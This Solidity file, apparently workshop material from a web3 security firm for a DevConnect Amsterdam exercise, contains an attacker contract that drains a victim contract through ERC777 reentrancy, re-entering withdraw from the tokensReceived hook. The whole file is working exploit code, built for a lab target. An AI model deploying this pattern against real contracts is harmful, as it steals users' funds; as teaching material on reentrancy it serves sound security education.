// SPDX-License-Identifier: GPL-3.0
/**  Do NOT use this code in production **
    _    _           _ _             
   | |  | |         (_) |            
   | |  | |___  ____ _| | ___   ____ 
    \ \/ / _  )/ ___) | |/ _ \ / _  |
     \  ( (/ /| |   | | | |_| ( ( | |
    _ \/ \____)_|   |_|_|\___/ \_|| |
   | |        | |      _      (_____|
    \ \   ___ | |_   _| |_ (_) ___  ____   ___ 
     \ \ / _ \| | | | |  _)| |/ _ \|  _ \ /___)
 _____) ) |_| | | |_| | |__| | |_| | | | |___ |
(______/ \___/|_|\____|\___)_|\___/|_| |_(___/ 
                                               
Verilog Solutions Inc. https://www.verilog.solutions
Verilog is a full-stack web3 security firm, covering smart contract auditing, 
validator operations, venture investment, and incubation.
Glad to prepare and present the materials for Game Day Remix in DevConnect Amsterdam!
*/

pragma solidity ^0.8.4;
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "./interface/IAbraveVictim.sol";
import "./interface/IAbraveToken.sol";

contract AbraveAttacker is IERC777Recipient {
    IAbraveVictim public victim;
    IAbraveToken public token;

    constructor(IAbraveVictim victim_address, IAbraveToken token_address) {
        victim = victim_address;
        token = token_address;
    }

    function attack(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        token.increaseAllowance(address(victim), amount);
        victim.deposit(amount);
        victim.withdraw(address(this));
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        // mute the compiler warinings
        operator;
        from;
        to;
        amount;
        userData;
        operatorData;

        if (from != address(victim)) {
            return;
        }
        // 10 ** 18 in value == 1 AGT
        if (token.balanceOf(address(from)) > 10**18) {
            victim.withdraw(address(this));
        }
    }

    fallback() external {
        // no need, tokensReceived() is the fallback
    }
}
